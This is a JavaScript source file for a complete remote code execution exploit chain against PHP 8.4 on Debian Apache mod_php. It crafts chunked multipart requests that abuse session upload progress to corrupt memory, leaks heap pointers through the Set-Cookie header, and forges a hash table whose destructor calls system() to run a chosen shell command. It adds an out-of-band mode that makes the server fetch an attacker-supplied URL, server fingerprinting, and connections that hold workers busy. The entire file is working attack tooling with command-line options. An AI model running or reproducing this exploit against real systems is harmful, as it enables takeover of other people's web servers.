#!/usr/bin/env node
/**
 * php2shell 8.4 — Debian Apache mod_php chain (JavaScript implementation).
 *
 * A1  chunked multipart -> OOM in the END cleanup, dangling PS(id)
 * B1  chunked multipart -> forged zend_string; Set-Cookie leaks the heap
 * A2  cheap OOM -> dangling PS(hash_serialize_verifier)
 * B2  fake zend_reference -> fake zend_array with pDestructor = zif_system
 *
 * Addresses are BigInt: 0x7f... does not fit in a JS Number.
 */

import { existsSync, readFileSync, statSync } from 'node:fs'
import { connect } from 'node:net'
import { pathToFileURL } from 'node:url'

export const BOUNDARY = Buffer.from('C'.repeat(10))
export const Q = '?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v'
export const LEAK_SPEC = [
  ...Array.from({ length: 14 }, () => ['G', 511, 0x137]),
  ['G', 400, 0x137],
  ['G', 511, 0x137],
  ['X', 900],
]
export const FAKE_LEN = 0xc8000
export const MAIN_BUCKET_COUNT = 87
export const DELTA_MIN = 0x1a00000n
export const DELTA_MAX = 0x1f00000n
export const HEAP_MIN = 0x700000000000n
export const HEAP_MAX = 0x7ffffffffffffn
export const CHUNK_MASK = ~0x1fffffn

export const CANDIDATES = [
  { version: '8.4.26', distro: 'trixie', zif: 0x465370n, dtor: 0x65eb60n, sOff: 0xf8398n },
]

let ZDTOR_OFF = 0x65eb60n
let ZIF_OFF = 0x465370n
let S_OFF = 0xf8398n

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))

/**
 * @param {string} name
 * @param {Buffer} [value]
 * @param {string|null} [filename]
 * @param {string|null} [ctype]
 * @returns {Buffer}
 */
export function part(name, value = Buffer.alloc(0), filename = null, ctype = null) {
  let out = Buffer.concat([
    Buffer.from('--'),
    BOUNDARY,
    Buffer.from(`\r\nContent-Disposition: form-data; name="${name}"`),
  ])
  if (filename !== null) out = Buffer.concat([out, Buffer.from(`; filename="${filename}"`)])
  out = Buffer.concat([out, Buffer.from('\r\n')])
  if (ctype !== null) out = Buffer.concat([out, Buffer.from(`Content-Type: ${ctype}\r\n`)])
  return Buffer.concat([out, Buffer.from('\r\n'), value, Buffer.from('\r\n')])
}

/**
 * @param {object} [o]
 * @returns {Buffer}
 */
export function a1Body(o = {}) {
  const parts = o.parts ?? 860
  const depth = o.depth ?? 64
  const keyPad = o.keyPad ?? 90
  const fillers = o.fillers ?? 14
  const big = o.big ?? 78
  const bigLen = o.bigLen ?? 8000
  const burners = o.burners ?? 20
  const burnerLen = o.burnerLen ?? 4000
  const progressLen = o.progressLen ?? 4000
  const sidHex = o.sidHex ?? '00'
  const progressFirst = o.progressFirst ?? false
  const progressAfterParts = o.progressAfterParts ?? null

  const chunks = []
  chunks.push(part('PHPSESSID', Buffer.from(sidHex, 'hex')))
  const progressPart = part('PHP_SESSION_UPLOAD_PROGRESS', Buffer.from('k'.repeat(progressLen)))
  if (progressFirst) chunks.push(progressPart)

  for (let i = 0; i < parts; i += 1) {
    const name = Buffer.concat([
      Buffer.from(`files[R${String(i).padStart(5, '0')}${'K'.repeat(keyPad)}]`),
      Buffer.from('[a]'.repeat(Math.max(0, depth - 2))),
    ]).toString('latin1')
    const ctype = i === 0 ? 'C'.repeat(103) : i === 1 ? 'C'.repeat(231) : 'application/octet-stream'
    let p = Buffer.concat([
      Buffer.from('--'),
      BOUNDARY,
      Buffer.from(`\r\nContent-Disposition: form-data; name="${name}"`),
      Buffer.from(`; filename="${i < 2 ? 'A' : ''}"\r\n`),
      Buffer.from(`Content-Type: ${ctype}\r\n\r\n`),
    ])
    chunks.push(p)
    if (progressAfterParts !== null && !progressFirst && i + 1 === progressAfterParts) {
      chunks.push(progressPart)
    }
  }
  for (let i = 0; i < fillers; i += 1) {
    const name = `f${String(i).padStart(4, '0')}`.padEnd(103, 'x').slice(0, 103)
    chunks.push(part(name, Buffer.from('v'.repeat(8))))
  }
  for (let i = 0; i < big; i += 1) {
    chunks.push(part(`b${String(i).padStart(4, '0')}`, Buffer.from('B'.repeat(bigLen))))
  }
  for (let i = 0; i < burners; i += 1) {
    chunks.push(part(`u${String(i).padStart(2, '0')}`, Buffer.from('U'.repeat(burnerLen))))
  }
  if (!progressFirst && progressAfterParts === null) chunks.push(progressPart)
  chunks.push(Buffer.concat([Buffer.from('--'), BOUNDARY, Buffer.from('--\r\n')]))
  return Buffer.concat(chunks)
}

function tag8(idx, tagged) {
  return tagged ? Buffer.from(`/${String(idx % 100).padStart(2, '0')}BBBBB`) : Buffer.from('BBBB/BBB')
}

function forgeInValue(pages, page, fakeLen, idx = 0, tagged = true) {
  const length = pages * 4096 - 25
  const v = Buffer.alloc(length, 0x41)
  const hdr = page * 0x1000 - 0x1018
  if (hdr >= 0 && hdr + 0x18 + 8 <= length) {
    v.writeUInt32LE(0, hdr)
    v.writeUInt32LE(0x16, hdr + 4)
    v.writeBigUInt64LE(0n, hdr + 8)
    v.writeBigUInt64LE(BigInt(fakeLen), hdr + 0x10)
    tag8(idx, tagged).copy(v, hdr + 0x18)
  }
  return v
}

function plainPages(pages, fill) {
  return Buffer.alloc(pages * 4096 - 25, fill)
}

/**
 * @param {Array<[string, number, number?]>} spec
 * @param {object} [o]
 * @returns {Buffer}
 */
export function b1Body(spec = LEAK_SPEC, o = {}) {
  const fakeLen = o.fakeLen ?? FAKE_LEN
  const sid = o.sid ?? 'a'
  const progress = o.progress ?? 'k0'
  const nameLen = o.nameLen ?? 120
  const includeSid = o.includeSid ?? true

  const chunks = []
  if (includeSid) chunks.push(part('PHPSESSID', Buffer.from(sid)))
  chunks.push(part('PHP_SESSION_UPLOAD_PROGRESS', Buffer.from(progress)))
  let idx = 0
  for (const item of spec) {
    const kind = item[0]
    if (kind === 'X') {
      for (let j = 0; j < item[1]; j += 1) {
        chunks.push(part(`x${String(idx).padStart(5, '0')}${'[a]'.repeat(12)}`, Buffer.from('v')))
        idx += 1
      }
      continue
    }
    let value
    if (kind === 'F') value = plainPages(item[1], 0x41)
    else if (kind === 'S') value = plainPages(item[1], 0x53)
    else if (kind === 'G') value = forgeInValue(item[1], item[2], fakeLen, idx, true)
    else throw new Error(`spec invalida: ${kind}`)
    const name = `f${String(idx).padStart(4, '0')}`.padEnd(nameLen, 'f').slice(0, nameLen)
    chunks.push(part(name, value))
    idx += 1
  }
  chunks.push(Buffer.concat([Buffer.from('--'), BOUNDARY, Buffer.from('--\r\n')]))
  return Buffer.concat(chunks)
}

/**
 * @param {object} [o]
 * @returns {Buffer}
 */
export function a2Body(o = {}) {
  const parts = o.parts ?? 880
  const depth = o.depth ?? 64
  const fillers = o.fillers ?? 115
  const sid = o.sid ?? Buffer.from([0])
  const progress = o.progress ?? Buffer.from('k0')

  const chunks = []
  chunks.push(part('PHPSESSID', sid))
  chunks.push(part('PHP_SESSION_UPLOAD_PROGRESS', progress))
  for (let i = 0; i < fillers; i += 1) {
    chunks.push(part(String(i).padStart(3, '0'), Buffer.from('x')))
  }
  for (let i = 0; i < parts; i += 1) {
    const name = `files[R${String(i).padStart(5, '0')}]${'[a]'.repeat(Math.max(0, depth - 2))}`
    chunks.push(
      Buffer.concat([
        Buffer.from('--'),
        BOUNDARY,
        Buffer.from(`\r\nContent-Disposition: form-data; name="${name}"; filename=""\r\n`),
        Buffer.from('Content-Type: application/octet-stream\r\n\r\n'),
      ]),
    )
  }
  chunks.push(Buffer.concat([Buffer.from('--'), BOUNDARY, Buffer.from('--\r\n')]))
  return Buffer.concat(chunks)
}

/**
 * @param {bigint} S
 * @param {bigint} zif
 * @param {string} cmd
 * @param {number} [size]
 * @returns {Buffer}
 */
export function htBytes(S, zif, cmd, size = 384) {
  const cmdBuf = Buffer.from(cmd)
  const limit = size - 0x99
  if (cmdBuf.length > limit) {
    throw new Error(`comando tem ${cmdBuf.length} bytes; o carrier aceita no maximo ${limit}`)
  }
  const ht = Buffer.alloc(size)
  ht.writeUInt32LE(1, 0x00)
  ht.writeUInt32LE(7, 0x04)
  ht.writeUInt32LE(0x10, 0x08)
  ht.writeUInt32LE(0xfffffff8, 0x0c)
  ht.writeBigUInt64LE(S + 0x20n, 0x10)
  ht.writeUInt32LE(1, 0x18)
  ht.writeUInt32LE(1, 0x1c)
  ht.writeUInt32LE(8, 0x20)
  ht.writeUInt32LE(0, 0x24)
  ht.writeBigUInt64LE(0n, 0x28)
  ht.writeBigUInt64LE(zif, 0x30)
  const E = 0x20
  ht.writeBigUInt64LE(zif, E + 0x10)
  ht.writeUInt32LE(1, E + 0x2c)
  ht.writeBigUInt64LE(S + 0x80n, E + 0x50)
  ht.writeUInt32LE(6, E + 0x58)
  ht.writeUInt32LE(1, 0x80)
  ht.writeUInt32LE(0x106, 0x84)
  ht.writeBigUInt64LE(BigInt(cmdBuf.length), 0x90)
  cmdBuf.copy(ht, 0x98)
  ht.writeUInt8(0, 0x98 + cmdBuf.length)
  return ht
}

function fakeRef(ptr, rc = 1, valType = 0x0107) {
  const rv = Buffer.alloc(32)
  rv.writeUInt32LE(rc, 0)
  rv.writeUInt8(0x0a, 4)
  rv.writeBigUInt64LE(ptr, 8)
  rv.writeUInt32LE(valType, 16)
  return rv
}

function spray(vl, ptr) {
  const v = Buffer.alloc(vl, 0x53)
  let o = 8
  while (o + 32 <= vl) {
    fakeRef(ptr).copy(v, o)
    o += 32
  }
  return v
}

/**
 * @param {bigint} S
 * @param {bigint} zif
 * @param {string} cmd
 * @param {object} [o]
 * @returns {Buffer}
 */
export function b2Body(S, zif, cmd, o = {}) {
  const vl = o.vl ?? 384
  const n1 = o.n1 ?? 500
  const n2 = o.n2 ?? 495
  const nameLen = o.nameLen ?? 10
  const ht = htBytes(S, zif, cmd)
  const sprayBuf = spray(vl, S)
  const chunks = []
  for (let i = 0; i < n1; i += 1) {
    const nm = `s${String(i).padStart(9, '0')}${'x'.repeat(nameLen)}`.slice(0, nameLen)
    chunks.push(part(nm, sprayBuf))
  }
  chunks.push(part('ht', ht))
  chunks.push(part('PHPSESSID', Buffer.from('a'.repeat(32))))
  chunks.push(part('PHP_SESSION_UPLOAD_PROGRESS', Buffer.from('k0')))
  for (let i = 0; i < n2; i += 1) {
    const nm = `t${String(i).padStart(9, '0')}${'x'.repeat(nameLen)}`.slice(0, nameLen)
    chunks.push(part(nm, sprayBuf))
  }
  chunks.push(Buffer.concat([Buffer.from('--'), BOUNDARY, Buffer.from('--\r\n')]))
  return Buffer.concat(chunks)
}

function unquoteToBytes(value) {
  const out = []
  for (let i = 0; i < value.length; i += 1) {
    if (value[i] === '%' && i + 2 < value.length) {
      const hex = value.slice(i + 1, i + 3)
      if (/^[0-9a-fA-F]{2}$/.test(hex)) {
        out.push(parseInt(hex, 16))
        i += 2
        continue
      }
    }
    out.push(value.charCodeAt(i) & 0xff)
  }
  return Buffer.from(out)
}

/**
 * @param {Buffer} resp
 * @returns {{decoded: number, zdtor: bigint, lib: bigint, buckets: Map<bigint, number>, candidates: bigint[]}}
 */
export function parseLeak(resp) {
  const marker = Buffer.from('Set-Cookie: PHPSESSID=')
  const i = resp.indexOf(marker)
  if (i < 0) throw new Error(`no Set-Cookie (${resp.length} bytes)`)
  const rest = resp.subarray(i + marker.length)
  const end = rest.indexOf('\r\n')
  const raw = (end < 0 ? rest : rest.subarray(0, end)).toString('latin1')
  const dec = unquoteToBytes(raw)
  const counts = new Map()
  for (let off = 0; off < dec.length - 8; off += 8) {
    const q = dec.readBigUInt64LE(off)
    if (q >= HEAP_MIN && q <= HEAP_MAX) counts.set(q, (counts.get(q) ?? 0) + 1)
  }
  if (counts.size === 0) throw new Error('no heap pointers')
  let zdtor = 0n
  let zmax = -1
  for (const [q, c] of counts) {
    if (c > zmax) {
      zdtor = q
      zmax = c
    }
  }
  const lib = zdtor - ZDTOR_OFF
  const buckets = new Map()
  for (const [q, c] of counts) {
    const b = q & CHUNK_MASK
    buckets.set(b, (buckets.get(b) ?? 0) + c)
  }
  const libBucket = zdtor & CHUNK_MASK
  const plausible = [...buckets].filter(
    ([b]) => b !== libBucket && lib - b >= DELTA_MIN && lib - b <= DELTA_MAX,
  )
  plausible.sort((a, b) => b[1] - a[1])
  let cands = plausible
  if (cands.length === 0) {
    const sorted = [...buckets].sort((a, b) => b[1] - a[1])
    const idBucket = sorted[0]?.[0]
    cands = sorted.filter(([b]) => b !== libBucket && b !== idBucket)
    cands.sort((a, b) => {
      const da = Math.abs(a[1] - MAIN_BUCKET_COUNT)
      const db = Math.abs(b[1] - MAIN_BUCKET_COUNT)
      return da - db || b[1] - a[1]
    })
  }
  return {
    decoded: dec.length,
    zdtor,
    lib,
    buckets,
    candidates: cands.slice(0, 3).map(([b]) => b),
  }
}

function responseFromSocket(socket, body, timeout) {
  return new Promise((resolve) => {
    const chunks = []
    let done = false
    const finish = () => {
      if (done) return
      done = true
      socket.destroy()
      resolve(Buffer.concat(chunks))
    }
    socket.setTimeout(timeout, finish)
    socket.on('data', (d) => {
      chunks.push(d)
      if (Buffer.concat(chunks).length >= (4 << 20)) finish()
    })
    socket.on('end', finish)
    socket.on('close', finish)
    socket.on('error', finish)
    socket.write(body)
  })
}

/**
 * @param {{host?: string, port: number, path: string, body: Buffer, timeout?: number}} o
 * @returns {Promise<Buffer>}
 */
export function chunkedPost(o) {
  const host = o.host ?? '127.0.0.1'
  const timeout = o.timeout ?? 180
  const head = Buffer.from(
    `POST ${o.path} HTTP/1.1\r\nHost: ${host}:${o.port}\r\n` +
      `Content-Type: multipart/form-data; boundary=${BOUNDARY.toString()}\r\n` +
      'Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n',
  )
  const pieces = [head]
  for (let i = 0; i < o.body.length; i += 65536) {
    const piece = o.body.subarray(i, i + 65536)
    pieces.push(Buffer.from(`${piece.length.toString(16)}\r\n`))
    pieces.push(piece)
    pieces.push(Buffer.from('\r\n'))
  }
  pieces.push(Buffer.from('0\r\n\r\n'))
  return new Promise((resolve) => {
    const socket = connect({ host, port: o.port })
    socket.on('connect', () => {
      responseFromSocket(socket, Buffer.concat(pieces), timeout * 1000).then(resolve)
    })
    socket.on('error', () => resolve(Buffer.alloc(0)))
  })
}

/**
 * @param {{host?: string, port: number, path: string, body: Buffer, timeout?: number}} o
 * @returns {Promise<Buffer>}
 */
export function plainPost(o) {
  const host = o.host ?? '127.0.0.1'
  const timeout = o.timeout ?? 120
  const head = Buffer.from(
    `POST ${o.path} HTTP/1.1\r\nHost: ${host}:${o.port}\r\n` +
      `Content-Type: multipart/form-data; boundary=${BOUNDARY.toString()}\r\n` +
      `Content-Length: ${o.body.length}\r\nConnection: close\r\n\r\n`,
  )
  return new Promise((resolve) => {
    const socket = connect({ host, port: o.port })
    socket.on('connect', () => {
      responseFromSocket(socket, Buffer.concat([head, o.body]), timeout * 1000).then(resolve)
    })
    socket.on('error', () => resolve(Buffer.alloc(0)))
  })
}

export async function fingerprint(o) {
  const host = o.host ?? '127.0.0.1'
  return new Promise((resolve) => {
    const socket = connect({ host, port: o.port })
    let data = Buffer.alloc(0)
    socket.setTimeout(10000, () => {
      socket.destroy()
      resolve(null)
    })
    socket.on('connect', () => socket.write('GET / HTTP/1.0\r\nHost: x\r\n\r\n'))
    socket.on('data', (d) => {
      data = Buffer.concat([data, d])
      if (data.includes('\r\n\r\n')) {
        socket.destroy()
        const m = /X-Powered-By: PHP\/([0-9.]+)/i.exec(data.toString('latin1'))
        resolve(m ? m[1] : null)
      }
    })
    socket.on('error', () => resolve(null))
  })
}

/**
 * @param {string} host
 * @param {number} port
 * @param {number} n
 * @returns {{stop: () => void, sockets: import('node:net').Socket[]}}
 */
export function runBlockers(host, port, n) {
  const sockets = []
  let stopped = false
  const make = () => {
    if (stopped || sockets.length >= n) return
    const socket = connect({ host, port })
    sockets.push(socket)
    const bnd = Buffer.from('Z'.repeat(10))
    socket.on('connect', () => {
      socket.write(
        Buffer.from(
          `POST /index.php HTTP/1.1\r\nHost: ${host}:${port}\r\n` +
            `Content-Type: multipart/form-data; boundary=${bnd.toString()}\r\n` +
            'Transfer-Encoding: chunked\r\n\r\n',
        ),
      )
      const first = Buffer.concat([
        Buffer.from('--'),
        bnd,
        Buffer.from('\r\nContent-Disposition: form-data; name="x"\r\n\r\n'),
      ])
      socket.write(Buffer.concat([Buffer.from(`${first.length.toString(16)}\r\n`), first, Buffer.from('\r\n')]))
      const timer = setInterval(() => {
        if (stopped) {
          clearInterval(timer)
          return
        }
        socket.write(Buffer.concat([Buffer.from('100\r\n'), Buffer.alloc(0x100, 0x41), Buffer.from('\r\n')]))
      }, 300)
      socket.on('close', () => clearInterval(timer))
    })
    socket.on('error', () => {})
  }
  for (let i = 0; i < n; i += 1) setTimeout(make, i * 10)
  return {
    stop: () => {
      stopped = true
      for (const s of sockets) s.destroy()
    },
    sockets,
  }
}

function applyOffsets(zif, dtor, sOff) {
  ZIF_OFF = zif
  ZDTOR_OFF = dtor
  S_OFF = sOff
}

function proofSize(path) {
  try {
    return existsSync(path) ? statSync(path).size : 0
  } catch {
    return 0
  }
}

/**
 * @param {object} a
 * @param {string} label
 * @returns {Promise<boolean>}
 */
export async function runAttempt(a, label = '') {
  let info = null
  const a1Tries = a.a1Tries ?? 6
  for (let a1Try = 1; a1Try <= a1Tries; a1Try += 1) {
    console.log(`[${label}] A1 (${a1Try}/${a1Tries})`)
    await chunkedPost({
      host: a.host,
      port: a.port,
      path: a.path + Q,
      body: a1Body({
        parts: a.a1Parts ?? 860,
        depth: a.a1Depth ?? 64,
        keyPad: a.a1KeyPad ?? 90,
        fillers: a.a1Fillers ?? 14,
        big: a.a1Big ?? 78,
        bigLen: a.a1BigLen ?? 8000,
        burners: a.a1Burners ?? 20,
        burnerLen: a.a1BurnerLen ?? 4000,
        progressLen: a.a1ProgressLen ?? 4000,
        progressFirst: a.a1ProgressFirst ?? false,
        progressAfterParts: a.a1ProgressAfterParts ?? null,
      }),
      timeout: 180,
    })
    const b1 = b1Body(LEAK_SPEC, { includeSid: a.bIncludeSid ?? true })
    await sleep(10)
    for (let probe = 1; probe <= a.probes; probe += 1) {
      console.log(`[${label}] B1 probe ${probe}/${a.probes}`)
      try {
        const resp = await chunkedPost({
          host: a.host,
          port: a.port,
          path: a.bPath ?? a.path,
          body: b1,
          timeout: 300,
        })
        info = parseLeak(resp)
        break
      } catch (error) {
        if (probe === a.probes) console.log('   leak failed:', error.message)
        await sleep(100)
      }
    }
    if (info !== null) break
  }
  if (info === null) return false
  console.log(`   decoded=${info.decoded} zdtor=0x${info.zdtor.toString(16)} lib=0x${info.lib.toString(16)}`)
  if (a.leakOnly) {
    console.log('[leak-only] heap leak OK; A2/B2 nao executados')
    return true
  }
  const top = [...info.buckets].sort((x, y) => y[1] - x[1]).slice(0, 6)
  console.log('   buckets:', top.map(([b, c]) => [b.toString(16), c]))
  if (info.candidates.length === 0) {
    console.log('   no main candidate')
    return false
  }
  const main = a.main ?? info.candidates[0]
  const delta = info.lib - main
  console.log(`   main=0x${main.toString(16)} delta=0x${delta.toString(16)}`)
  if (!a.main && (delta < DELTA_MIN || delta > DELTA_MAX)) {
    console.log('   implausible delta')
    return false
  }
  const S = main + S_OFF
  const zif = info.lib + ZIF_OFF
  console.log(`[${label}] leak OK; S=0x${S.toString(16)} zif=0x${zif.toString(16)}`)
  const a2Tries = a.a2Tries ?? 6
  for (let a2Try = 1; a2Try <= a2Tries; a2Try += 1) {
    console.log(`[${label}] A2 (${a2Try}/${a2Tries})`)
    await plainPost({ host: a.host, port: a.port, path: a.path, body: a2Body(), timeout: 120 })
    await sleep(150)
    for (let probe = 1; probe <= a.probes; probe += 1) {
      await plainPost({
        host: a.host,
        port: a.port,
        path: a.path,
        body: b2Body(S, zif, a.cmd),
        timeout: 60,
      })
      await sleep(150)
      if (!a.oob && proofSize(a.proof) > 0) {
        console.log(`[4/4] RCE OK at B2 probe ${probe}; proof:`)
        console.log(readFileSync(a.proof, 'utf8').trimEnd())
        return true
      }
    }
  }
  if (a.oob) {
    console.log(`[4/4] fired ${a.probes} OOB requests; check the listener at ${a.oob}`)
    return true
  }
  return false
}

function parseIntList(value) {
  return Number(value)
}

/**
 * @param {string[]} argv
 * @returns {Promise<number>}
 */
export async function main(argv = process.argv.slice(2)) {
  /** @type {any} */
  const a = {
    port: 18110,
    path: '/index.php',
    cmd: 'id>/out/p1',
    retries: 3,
    proof: '/tmp/9bie/out/p1',
    probes: 20,
    a1Tries: 6,
    a2Tries: 6,
    blockers: 0,
    host: '127.0.0.1',
    zifOff: 0x465370n,
    dtorOff: 0x65eb60n,
    sOff: 0xf8398n,
    bPath: '',
    bIncludeSid: true,
    leakOnly: false,
    oob: '',
    auto: false,
  }

  for (let i = 0; i < argv.length; i += 1) {
    const flag = argv[i]
    const next = () => {
      i += 1
      if (i >= argv.length) throw new Error(`faltou valor para ${flag}`)
      return argv[i]
    }
    switch (flag) {
      case '--port': a.port = parseIntList(next()); break
      case '--path': a.path = next(); break
      case '--cmd': a.cmd = next(); break
      case '--retries': a.retries = parseIntList(next()); break
      case '--proof': a.proof = next(); break
      case '--probes': a.probes = parseIntList(next()); break
      case '--a1-tries': a.a1Tries = parseIntList(next()); break
      case '--a2-tries': a.a2Tries = parseIntList(next()); break
      case '--blockers': a.blockers = parseIntList(next()); break
      case '--a1-big-len': a.a1BigLen = parseIntList(next()); break
      case '--a1-parts': a.a1Parts = parseIntList(next()); break
      case '--a1-depth': a.a1Depth = parseIntList(next()); break
      case '--a1-key-pad': a.a1KeyPad = parseIntList(next()); break
      case '--a1-fillers': a.a1Fillers = parseIntList(next()); break
      case '--a1-big': a.a1Big = parseIntList(next()); break
      case '--a1-burners': a.a1Burners = parseIntList(next()); break
      case '--a1-burner-len': a.a1BurnerLen = parseIntList(next()); break
      case '--a1-progress-len': a.a1ProgressLen = parseIntList(next()); break
      case '--a1-progress-first': a.a1ProgressFirst = true; break
      case '--a1-progress-after-parts': a.a1ProgressAfterParts = parseIntList(next()); break
      case '--b-path': a.bPath = next(); break
      case '--b-no-sid': a.bIncludeSid = false; break
      case '--leak-only': a.leakOnly = true; break
      case '--host': a.host = next(); break
      case '--zif-off': a.zifOff = BigInt(next()); break
      case '--dtor-off': a.dtorOff = BigInt(next()); break
      case '--s-off': a.sOff = BigInt(next()); break
      case '--main': a.main = BigInt(next()); break
      case '--oob': a.oob = next(); break
      case '--auto': a.auto = true; break
      case '-h':
      case '--help':
        console.log('uso: node engine/pure_fixed.js --port 19300 --cmd "id>/out/p1" --proof out/p1')
        return 0
      default:
        throw new Error(`opcao desconhecida: ${flag}`)
    }
  }
  if (!a.bPath) a.bPath = a.path

  let candidates
  if (a.auto) {
    const ver = await fingerprint({ host: a.host, port: a.port })
    console.log(ver ? `[*] fingerprint: PHP/${ver}` : '[*] fingerprint: unknown')
    candidates = CANDIDATES.filter((c) => !ver || c.version === ver)
    if (candidates.length === 0) candidates = CANDIDATES
  } else {
    candidates = [{ distro: 'manual', zif: a.zifOff, dtor: a.dtorOff, sOff: a.sOff }]
  }
  if (a.oob) {
    a.cmd = `php -r "file_get_contents('${a.oob}');"`
    console.log(`[*] OOB mode: command = ${a.cmd}`)
  }

  for (const cand of candidates) {
    applyOffsets(cand.zif, cand.dtor, cand.sOff)
    console.log(
      `[*] candidate build: ${cand.distro} (zif=0x${cand.zif.toString(16)} ` +
        `dtor=0x${cand.dtor.toString(16)} S=0x${cand.sOff.toString(16)})`,
    )
    let blockers = null
    if (a.blockers > 0) {
      console.log(`[*] bloqueando ${a.blockers} workers`)
      blockers = runBlockers(a.host, a.port, a.blockers)
      await sleep(2500)
    }
    try {
      for (let attempt = 1; attempt <= a.retries; attempt += 1) {
        if (await runAttempt(a, `${cand.distro} try ${attempt}`)) return 0
      }
    } finally {
      blockers?.stop()
    }
  }
  return 1
}

const isMain =
  process.argv[1] !== undefined &&
  import.meta.url === pathToFileURL(process.argv[1]).href

if (isMain) {
  main()
    .then((code) => process.exit(code))
    .catch((error) => {
      console.error(error)
      process.exit(2)
    })
}
